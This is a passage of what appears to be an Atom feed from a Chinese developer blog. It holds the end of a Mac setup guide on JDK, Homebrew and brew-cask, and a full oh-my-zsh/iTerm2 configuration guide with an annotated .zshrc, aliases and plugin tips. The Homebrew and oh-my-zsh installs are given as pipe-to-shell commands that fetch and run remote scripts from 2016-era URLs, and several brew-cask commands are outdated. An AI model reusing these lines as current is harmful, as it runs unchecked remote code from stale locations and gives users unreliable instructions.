<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>现在 OS X 都不会自带 JDK 了，所以进行 Java 开发的话，需要下载 JDK。在 brew-cask 之前，我们需要从 <a href="https://developer.apple.com/downloads/" target="_blank" rel="external">https://developer.apple.com/downloads/</a> 或者 Oracle 网站上下载。还有更麻烦的－－卸载 JDK 和升级 JDK。</p>
<p>JDK 安装文件是 pkg 格式，卸载和<code>.app</code>不一样，且没有自动卸载方式。</p>
<p>而 brew-cask 提供了自动安装和卸载功能，能够自动从官网上下载并安装 JDK 8。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install java</span><br></pre></td></tr></table></figure>
<p>如果你需要安装 JDK 7 或者 JDK 6，可以使用<code>homebrew-cask-versions</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew tap caskroom/versions</span><br><span class="line">brew cask install java6</span><br></pre></td></tr></table></figure>
<p>在 OS X 上，你可以同时安装多个版本的 JDK。你可以通过命令<code>/usr/libexec/java_home -V</code>来查看安装了哪几个 JDK。</p>
<p>那问题来了，当你运行<code>java</code>或者 Java 程序时使用的是哪个 JDK 呢？在 OS X 下，<code>java</code>也就是<code>/usr/bin/java</code>在默认情况下指向的是已经安装的最新版本。但是你可以设置环境变量<code>JAVA_HOME</code>来更改其指向：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ java -version</span><br><span class="line">java version <span class="string">"1.8.0_60"</span></span><br><span class="line">Java(TM) SE Runtime Environment (build <span class="number">1.8</span>.<span class="number">0</span>_60-b27)</span><br><span class="line">Java HotSpot(TM) <span class="number">64</span>-Bit Server VM (build <span class="number">25.60</span>-b23, mixed mode)</span><br><span class="line">$ JAVA_HOME=/Library/Java/JavaVirtualMachines/<span class="number">1.6</span>.<span class="number">0</span>.jdk/Contents/Home java -version</span><br><span class="line">java version <span class="string">"1.6.0_65"</span></span><br><span class="line">Java(TM) SE Runtime Environment (build <span class="number">1.6</span>.<span class="number">0</span>_65-b14-<span class="number">466.1</span>-<span class="number">11</span>M4716)</span><br><span class="line">Java HotSpot(TM) <span class="number">64</span>-Bit Server VM (build <span class="number">20.65</span>-b04-<span class="number">466.1</span>, mixed mode)</span><br></pre></td></tr></table></figure>
<p>其中<code>JAVA_HOME=/Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents/Home</code>可以用<code>JAVA_HOME=`/usr/libexec/java_home -v 1.6` </code>这种更加通用的方式代替。</p>
<h3 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h3><p>Mac OS X是基于Unix的操作系统，可以安装大部分为Unix/Linux开发的软件。然而，如果只是以使用为目的，对每个软件都进行手工编译不是很方便，也不利于管理已安装的软件，于是出现了类似于Linux中APT、Yum等类似的软件包管理系统，其中最著名的有MacPorts、Fink、Homebrew等。</p>
<p>Homebrew 尽可能地利用系统自带的各种库，使得软件包的编译时间大为缩短；同时由于几乎不会造成冗余，软件包的管理也清晰、灵活了许多。Homebrew的另一个特点是使用Ruby定义软件包安装配置（叫做formula），定制非常简单。</p>
<p>Homebrew的安装非常简单，在终端程序中输入以下命令即可。</p>
<pre><code>ruby -e &quot;$(curl -fsSL https://raw.github.com/mxcl/homebrew/go)&quot;
</code></pre><p>由于Homebrew的安装地址可能变化，请到官方网站查看最新的安装方法。</p>
<p>Homebrew的可执行命令是brew，其基本使用方法如下（以wget为例）。</p>
<ul>
<li>查找软件包 <code>brew search wget</code></li>
<li>安装软件包 <code>brew install wget</code></li>
<li>列出已安装的软件包 <code>brew list</code></li>
<li>删除软件包 <code>brew remove wget</code></li>
<li>查看软件包信息 <code>brew info wget</code></li>
<li>列出软件包的依赖关系 <code>brew deps wget</code></li>
<li>更新 <code>brew update</code></li>
<li>列出过时的软件包（已安装但不是最新版本）<code>brew outdated</code></li>
<li>更新过时的软件包（全部或指定）<code>brew upgrade</code> 或 <code>brew upgrade wget</code></li>
</ul>
<h3 id="Homebrew_Cask"><a href="#Homebrew_Cask" class="headerlink" title="Homebrew Cask"></a><a href="http://caskroom.io" target="_blank" rel="external">Homebrew Cask</a></h3><p>brew-cask 允许你使用命令行安装 OS X 应用。比如你可以这样安装 Chrome：<code>brew cask install google-chrome</code>。还有 Evernote、Skype、Sublime Text、VirtualBox 等都可以用 brew-cask 安装。</p>
<p>brew-cask 是社区驱动的，如果你发现 brew-cask 上的应用不是最新版本，或者缺少你某个应用，你可以自己提交 pull request。</p>
<p>安装：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install caskroom/cask/brew-cask</span><br></pre></td></tr></table></figure>
<p>应用也可以通过 App Store 安装，而且有些应用只能通过 App Store 安装，比如 Xcode 等一些 Apple 的应用。App Store 没有对应的命令行工具，还需要 Apple ID。倒是更新起来很方便。</p>
<p>几乎所有常用的应用都可以通过 brew-cask 安装，所以你要安装新的应用时，建议用 brew-cask 安装。如果你不知道应用在 brew-cask 中的 ID，可以先用<code>brew cask search</code>命令搜索。</p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://github.com/macdao/ocds-guide-to-setting-up-mac" target="_blank" rel="external">如何配置一个高效的 Mac 工作环境</a></li>
<li><a href="http://lapwinglabs.com/blog/hacker-guide-to-setting-up-your-mac" target="_blank" rel="external">Hacker’s Guide to Setting up Your Mac</a></li>
<li><a href="https://mattstauffer.co/blog/setting-up-a-new-os-x-development-machine-part-1-core-files-and-custom-shell" target="_blank" rel="external">Setting up a new (OS X) development machine</a></li>
<li><a href="http://www.xialeizhou.com/?p=71" target="_blank" rel="external">高效 MacBook 工作环境配置</a></li>
<li><a href="http://www.zhihu.com/question/20873070" target="_blank" rel="external">程序员如何优雅地使用 Mac？</a></li>
<li><a href="http://sspai.com/27403" target="_blank" rel="external">少数派1</a></li>
<li><a href="http://sspai.com/28385" target="_blank" rel="external">少数派2</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这里主要整理一些一直以来使用 Mac 的技巧以及构建高效开发学习环境的指南。主要是按照个人的使用习惯，所以所用的工具和软件都比较偏写代码一些。</p>]]>
    
    </summary>
    
      <category term="Mac" scheme="http://wdxtub.com/tags/Mac/"/>
    
      <category term="技巧" scheme="http://wdxtub.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="疑难杂症" scheme="http://wdxtub.com/tags/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/"/>
    
      <category term="高效" scheme="http://wdxtub.com/tags/%E9%AB%98%E6%95%88/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[zsh 全程指南]]></title>
    <link href="http://wdxtub.com/2016/02/18/oh-my-zsh/"/>
    <id>http://wdxtub.com/2016/02/18/oh-my-zsh/</id>
    <published>2016-02-18T22:09:15.000Z</published>
    <updated>2016-02-19T13:43:58.000Z</updated>
    <content type="html"><![CDATA[<p>新年新气象，打算从 bash 迁移到 zsh 上来。网上教程很多，但是大多比较零散也不够让人知其所以然，而且很多配置也不符合我个人的习惯，于是打算『贪天之功』，写这么一个『全程指南』，希望能给大家带来些帮助。</p>
<a id="more"></a>
<hr>
<p>工欲善其事，必先利其器。工欲利其器，必先思其行。凡事谋定而后动，得有个基本的目标，才好一步一步细化并实施。实话说，zsh 真的比 bash 好很多吗？从小处着眼，是的，无论是历史记录还是搜索还是自定义插件，zsh 都比 bash 强，但是看看隔壁的 powershell(windows)，才算得上真正现代化面向对象的命令行工具。而且很多时候我们都是连接到远程的机器上进行编程和配置，在那里 bash 可是一统天下的（当然每次都愿意配置折腾一次，zsh 也不是不行）。那么问题就来了，为什么还要折腾呢？</p>
<p>答案很简单，充分利用高级功能，来提高自己的效率。当然，如果顺带能让界面更漂亮一点的话，何乐不为呢？不过有一点需要注意，如果要用 shell 脚本进行编程的话，最好还是按照 bash 的语法来做，不然把自己绑定到『非标准』的语法上，换个环境就可能导致巨大的问题。</p>
<p>如果只是想要换个主题弄得花里胡哨的话，那么还不如节省点时间去做有意义的事情，虽然网上都说 zsh 是『终结 shell』，但是其实哪有所谓的『终极』？只有自己成为了大师，才能『飞花落叶皆可伤人』。</p>
<p>不过既然说是『全程指南』，还是会尽量事无巨细介绍清楚，总体来说选择标准取决于我个人的审美和习惯，这点需要注意。</p>
<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
<li>安装 <a href="http://www.iterm2.com/" target="_blank" rel="external">iTerm2</a>（最近要出新版了，很多新特性还是值得期待的）</li>
<li>安装完成后可以在 iTerm2 中输入命令安装 <a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="external">oh-my-zsh</a><ul>
<li><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code> </li>
<li>因为 zsh 配置比较繁琐，所以这里可以直接用配置好的配置文件的基础上进行使用</li>
</ul>
</li>
<li>安装 <a href="http://powerline.readthedocs.org/en/latest/installation.html" target="_blank" rel="external">Powerline</a> （一个 vim 的插件，随后有用）<ul>
<li><code>pip install powerline-status</code></li>
<li>如果没有 <code>pip</code> 命令的话，先把 <code>pip</code> 装上：<code>sudo easy_install pip</code></li>
</ul>
</li>
<li>有些 zsh 中的主题需要使用额外的字体，我们也一并装好，<a href="https://github.com/powerline/fonts" target="_blank" rel="external">下载地址</a>。把所有东西下载下来，然后用命令行进入到 <code>install.sh</code> 所在文件夹，执行 <code>./install.sh</code> 进行安装</li>
</ol>
<h2 id="u73AF_u5883_u914D_u7F6E"><a href="#u73AF_u5883_u914D_u7F6E" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="u5B57_u4F53"><a href="#u5B57_u4F53" class="headerlink" title="字体"></a>字体</h3><p>前面我们安装了额外的字体，但是还是需要在 iTerm2 中配置一下，具体的字体选择有很多，只要是后面带有 Powerline 字样的就可以，注意 Regular Font 和 Non-ASCII Font 都需要进行修改</p>
<p><img src="/images/14558361988595.jpg" alt="Preference -&gt; Profiles -&gt; Text"></p>
<p>我觉得比较不错的字体有：</p>
<ul>
<li>Incosolata-dz for Powerline</li>
<li>Roboto Mono Light for Powerline</li>
<li>Ubuntu Mono derivative Powerline</li>
</ul>
<p>我自己在用的是</p>
<ul>
<li>Regular Font: 18pt Ubuntu Mono derivative Powerline</li>
<li>Non-ASCII Font: 14pt Roboto Mono for Powerline</li>
</ul>
<p><img src="/images/14558366464605.jpg" alt="效果图"></p>
<h3 id="u914D_u8272"><a href="#u914D_u8272" class="headerlink" title="配色"></a>配色</h3><p>这里就不推荐烂大街的 Solarized 配色了，而是直接给成吨选择，在<a href="http://iterm2colorschemes.com" target="_blank" rel="external">配色页面</a>中下载，然后根据截图自己选择，选择好之后在 Preference -&gt; Profiles -&gt; Colors 里面的 Load Presets 进行导入即可。我比较喜欢的是 Tomorrow Night 这个主题，并且稍微把颜色调亮了一点，显得比较活泼。像下面这样：</p>
<p><img src="/images/14558402138712.jpg" alt="Tomorrow Night"></p>
<p>其他我觉得比较不错的还有：</p>
<ul>
<li>Argonaut</li>
<li>Cobalt2</li>
<li>Molokai</li>
<li>Monokai Soda</li>
<li>PaulMillr</li>
<li>Solarized Dark Higher Contrast</li>
<li>SpaceGray Eighties</li>
<li>Thayer Bright</li>
<li>Tomorrow Night 全系列</li>
<li>Wez</li>
</ul>
<h3 id="u914D_u7F6E_u6587_u4EF6"><a href="#u914D_u7F6E_u6587_u4EF6" class="headerlink" title="配置文件"></a>配置文件</h3><p>大部分配置都可以在配置文件中进行设置，这里我大概翻译一下，以及给出自己的一些使用偏好。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ZSH的环境变量</span></span><br><span class="line"><span class="built_in">export</span> ZSH=/Users/dawang/.oh-my-zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题设置</span></span><br><span class="line"><span class="comment"># 主题列表在 ~/.oh-my-zsh/themes/</span></span><br><span class="line"><span class="comment"># 如果设置为 "random", 每次开启都会是不同的主题</span></span><br><span class="line">ZSH_THEME=<span class="string">"agnoster"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想要大小写敏感，可以取消注释下面的一行</span></span><br><span class="line"><span class="comment"># CASE_SENSITIVE="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想要连接符不敏感，可以取消注释下面的一行。_ 和 - 将可以互换</span></span><br><span class="line"><span class="comment"># HYPHEN_INSENSITIVE="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果不想要自动更新，可以取消注释下面的一行</span></span><br><span class="line"><span class="comment"># DISABLE_AUTO_UPDATE="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动更新的时间间隔，单位是天，这里设置 30 天更新一次</span></span><br><span class="line"><span class="built_in">export</span> UPDATE_ZSH_DAYS=<span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果不想要 ls 命令输出带颜色，可以取消注释下面的一行</span></span><br><span class="line"><span class="comment"># DISABLE_LS_COLORS="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否禁止更改终端标题,不要禁止,不然所有终端tab只显示zsh了,而不随着目录的改变而改变显示</span></span><br><span class="line"><span class="comment"># DISABLE_AUTO_TITLE="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动纠正命令,不启用,不怎么好用</span></span><br><span class="line"><span class="comment"># ENABLE_CORRECTION="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按tab键补全命令的时候,如果没什么可补全的就会出现三个红点,更人性化显示，这里我们启用</span></span><br><span class="line">COMPLETION_WAITING_DOTS=<span class="string">"true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment the following line if you want to disable marking untracked files</span></span><br><span class="line"><span class="comment"># under VCS as dirty. This makes repository status check for large repositories</span></span><br><span class="line"><span class="comment"># much, much faster.</span></span><br><span class="line"><span class="comment"># 不要在意这些细节，不需要改动</span></span><br><span class="line"><span class="comment"># DISABLE_UNTRACKED_FILES_DIRTY="true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 历史命令日期显示格式</span></span><br><span class="line"><span class="comment"># 有三种方式: "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"，我比较习惯最后那种</span></span><br><span class="line">HIST_STAMPS=<span class="string">"yyyy-mm-dd"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Would you like to use another custom folder than $ZSH/custom?</span></span><br><span class="line"><span class="comment"># ZSH_CUSTOM=/path/to/new-custom-folder</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which plugins would you like to load? (plugins can be found in ~/.oh-my-zsh/plugins/*)</span></span><br><span class="line"><span class="comment"># Custom plugins may be added to ~/.oh-my-zsh/custom/plugins/</span></span><br><span class="line"><span class="comment"># Example format: plugins=(rails git textmate ruby lighthouse)</span></span><br><span class="line"><span class="comment"># 插件设置，如果添加太多启动速度会比较慢</span></span><br><span class="line">plugins=(git autojump)</span><br><span class="line"></span><br><span class="line">[[ <span class="operator">-s</span> ~/.autojump/etc/profile.d/autojump.zsh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 剩下部分比较不常改动 </span></span><br><span class="line"><span class="comment"># User configuration</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/X11/bin:/Library/TeX/texbin"</span></span><br><span class="line"><span class="comment"># export MANPATH="/usr/local/man:$MANPATH"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># You may need to manually set your language environment</span></span><br><span class="line"><span class="comment"># export LANG=en_US.UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Preferred editor for local and remote sessions</span></span><br><span class="line"><span class="comment"># if [[ -n $SSH_CONNECTION ]]; then</span></span><br><span class="line"><span class="comment">#   export EDITOR='vim'</span></span><br><span class="line"><span class="comment"># else</span></span><br><span class="line"><span class="comment">#   export EDITOR='mvim'</span></span><br><span class="line"><span class="comment"># fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Compilation flags</span></span><br><span class="line"><span class="comment"># export ARCHFLAGS="-arch x86_64"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh</span></span><br><span class="line"><span class="comment"># export SSH_KEY_PATH="~/.ssh/dsa_id"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set personal aliases, overriding those provided by oh-my-zsh libs,</span></span><br><span class="line"><span class="comment"># plugins, and themes. Aliases can be placed here, though oh-my-zsh</span></span><br><span class="line"><span class="comment"># users are encouraged to define aliases within the ZSH_CUSTOM folder.</span></span><br><span class="line"><span class="comment"># For a full list of active aliases, run `alias`.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example aliases</span></span><br><span class="line"><span class="comment"># alias zshconfig="mate ~/.zshrc"</span></span><br><span class="line"><span class="comment"># alias ohmyzsh="mate ~/.oh-my-zsh"</span></span><br></pre></td></tr></table></figure>
<h2 id="u9AD8_u7EA7_u529F_u80FD"><a href="#u9AD8_u7EA7_u529F_u80FD" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="u5E38_u7528_u5FEB_u6377_u952E"><a href="#u5E38_u7528_u5FEB_u6377_u952E" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><ul>
<li>命令历史记录<ul>
<li>一旦在 shell 敲入正确命令并能执行后，shell 就会存储你所敲入命令的历史记录（存放在<code>~/.zsh_history</code> 文件中），方便再次运行之前的命令。可以按方向键↑和↓来查看之前执行过的命令</li>
<li>可以用 <code>!!</code>来执行上一条命令</li>
<li>使用 <code>ctrl-r</code> 来搜索命令历史记录</li>
</ul>
</li>
<li>命令和文件补全(按tab键)</li>
<li>命令别名<ul>
<li>可以简化命令输入，在 <code>.zshrc</code> 中添加 <code>alias shortcut=&#39;this is the origin command&#39;</code> 一行就相当于添加了别名</li>
<li>在命令行中输入 <code>alias</code> 可以查看所有的命令别名</li>
</ul>
</li>
</ul>
<p>一些比较好用的设置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> cls=<span class="string">'clear'</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">'ls -l'</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">'ls -a'</span></span><br><span class="line"><span class="built_in">alias</span> grep=<span class="string">"grep --color=auto"</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> html=<span class="string">'vim'</span>   <span class="comment"># 在命令行直接输入后缀为 html 的文件名，会在 Vim 中打开</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> rb=<span class="string">'vim'</span>     <span class="comment"># 在命令行直接输入 ruby 文件，会在 Vim 中打开</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> py=<span class="string">'vim'</span>      <span class="comment"># 在命令行直接输入 python 文件，会用 vim 中打开，以下类似</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> js=<span class="string">'vim'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> c=<span class="string">'vim'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> java=<span class="string">'vim'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> txt=<span class="string">'vim'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> gz=<span class="string">'tar -xzvf'</span> <span class="comment"># 在命令行直接输入后缀为 gz 的文件名，会自动解压打开</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> tgz=<span class="string">'tar -xzvf'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> zip=<span class="string">'unzip'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="operator">-s</span> bz2=<span class="string">'tar -xjvf'</span></span><br></pre></td></tr></table></figure>
<h3 id="u63D2_u4EF6"><a href="#u63D2_u4EF6" class="headerlink" title="插件"></a>插件</h3><p><strong>git</strong></p>
<p>在进入一个 git 文件夹后会切换显示的模式：</p>
<p><img src="/images/14558436247342.jpg" alt=""></p>
<p>自带大部分 git 命令的缩写，命令内容可以参考 <code>~/.oh-my-zsh/plugins/git/git.plugin.zsh</code></p>
<p>Oh My Zsh 提供了一套系统别名（alias），来达到相同的功能。比如<code>gst</code>作为<code>git status</code>的别名。而且 Git 插件是 Oh My Zsh 默认启用的，相当于你使用了 Oh My Zsh，你就拥有了一套高效率的别名，而且还是全球通用的。是不是棒棒哒？下面是一些我常用的别名：</p>
<table>
<thead>
<tr>
<th>Alias</th>
<th>Command</th>
</tr>
</thead>
<tbody>
<tr>
<td>gapa</td>
<td><code>git add --patch</code></td>
</tr>
<tr>
<td>gc!</td>
<td><code>git commit -v --amend</code></td>
</tr>
<tr>
<td>gcl</td>
<td><code>git clone --recursive</code></td>
</tr>
<tr>
<td>gclean</td>
<td><code>git reset --hard &amp;&amp; git clean -dfx</code></td>
</tr>
<tr>
<td>gcm</td>
<td><code>git checkout master</code></td>
</tr>
<tr>
<td>gcmsg</td>
<td><code>git commit -m</code></td>
</tr>
<tr>
<td>gco</td>
<td><code>git checkout</code></td>
</tr>
<tr>
<td>gd</td>
<td><code>git diff</code></td>
</tr>
<tr>
<td>gdca</td>
<td><code>git diff --cached</code></td>
</tr>
<tr>
<td>gp</td>
<td><code>git push</code></td>
</tr>
<tr>
<td>grbc</td>
<td><code>git rebase --continue</code></td>
</tr>
<tr>
<td>gst</td>
<td><code>git status</code></td>
</tr>
<tr>
<td>gup</td>
<td><code>git pull --rebase</code></td>
</tr>
</tbody>
</table>
<p>完整列表请参考：<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugin:git" target="_blank" rel="external">https://github.com/robbyrussell/oh-my-zsh/wiki/Plugin:git</a></p>
<p><strong>osx</strong></p>
<ul>
<li>tab - 在一个新标签打开当前目录</li>
<li>cdf - cd到当前Finder目录</li>
<li>quick-look - 快速浏览特殊的文件</li>
<li>man-preview - 在Preview应用打开特定的man page</li>
<li>trash - 将特定的文件移到垃圾桶</li>
</ul>
<p><strong>autojump</strong></p>
<p>这个插件会记录进入过的文件夹，下次再进入只要输入很少的内容即可，如下图所示：</p>
<p><img src="/images/14558437933171.jpg" alt=""></p>
<p><strong>zsh-syntax-highlighting</strong></p>
<p>这是一个类似 fish 的命令高亮插件，安装也很简单 <code>brew install zsh-syntax-highlighting</code>，需要把 <code>source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code> 添加到 <code>.zshrc</code> 的最后面。</p>
<p>其他的<a href="https://github.com/zsh-users/zsh-syntax-highlighting/blob/master/INSTALL.md" target="_blank" rel="external">安装方法</a></p>
<h3 id="u4F7F_u7528_u6280_u5DE7"><a href="#u4F7F_u7528_u6280_u5DE7" class="headerlink" title="使用技巧"></a>使用技巧</h3><ol>
<li>连按两次Tab会列出所有的补全列表并直接开始选择，补全项可以使用 ctrl+n/p/f/b上下左右切换</li>
<li>命令选项补全。在zsh中只需要键入 <code>tar -&lt;tab&gt;</code> 就会列出所有的选项和帮助说明</li>
<li>命令参数补全。键入 <code>kill &lt;tab&gt;</code> 就会列出所有的进程名和对应的进程号</li>
<li>更智能的历史命令。在用<ctrl-p>或者方向上键查找历史命令时，zsh支持限制查找。比如，输入<code>ls</code>,然后再按方向上键，则只会查找用过的ls命令。而此时使用<ctrl-p>则会仍然按之前的方式查找，忽略 <code>ls</code></ctrl-p></ctrl-p></li>
<li>多个终端会话共享历史记录</li>
<li>智能跳转，安装了 autojump 之后，zsh 会自动记录你访问过的目录，通过 <code>j 目录名</code> 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全，例如你访问过 hadoop-1.0.0 目录，输入<code>j hado</code> 即可正确跳转。<code>j --stat</code> 可以看你的历史路径库。</li>
<li>目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转。</li>
<li>在当前目录下输入 <code>..</code> 或 <code>...</code> ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。在你知道路径的情况下，比如 <code>/usr/local/bin</code> 你可以输入 <code>cd /u/l/b</code> 然后按<tab>进行补全快速输入</tab></li>
<li>通配符搜索：<code>ls -l **/*.sh</code>，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find。使用 <code>**/</code> 来递归搜索</li>
<li>扩展环境变量，输入环境变量然后按 <tab> 就可以转换成表达的值</tab></li>
<li>在 <code>.zshrc</code> 中添加 <code>setopt HIST_IGNORE_DUPS</code> 可以消除重复记录，也可以利用 <code>sort -t &quot;;&quot; -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history</code> 手动清除</li>
</ol>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="http://macshuo.com/?p=676" target="_blank" rel="external">终极 Shell</a></li>
<li><a href="http://hackerxu.com/2014/11/19/ZSH.html" target="_blank" rel="external">Zsh使用指南(译)</a></li>
<li><a href="http://www.jianshu.com/p/dc4ee939a08d" target="_blank" rel="external">zsh调研(2)配置和使用</a></li>
<li><a href="http://blog.csdn.net/yangcs2009/article/details/45720193" target="_blank" rel="external">Shell（一）：功能、配置和插件（附iTerm 2(for mac) &amp;&amp; Oh My Zsh教程）</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87" target="_blank" rel="external">Zsh (简体中文)</a>)</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>新年新气象，打算从 bash 迁移到 zsh 上来。网上教程很多，但是大多比较零散也不够让人知其所以然，而且很多配置也不符合我个人的习惯，于是打算『贪天之功』，写这么一个『全程指南』，希望能给大家带来些帮助。</p>]]>
    
    </summary>
    
      <category term="Mac" scheme="http://wdxtub.com/tags/Mac/"/>
    
      <category term="bash" scheme="http://wdxtub.com/tags/bash/"/>
    
      <category term="zsh" scheme="http://wdxtub.com/tags/zsh/"/>
    
      <category term="命令行" scheme="http://wdxtub.com/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[软件架构与设计 第 14 课 Architecture Tradeoff Analysis Method]]></title>
    <link href="http://wdxtub.com/2016/02/18/sad-14/"/>
    <id>http://wdxtub.com/2016/02/18/sad-14/</id>
    <published>2016-02-18T16:03:29.000Z</published>
    <updated>2016-02-18T20:52:54.000Z</updated>
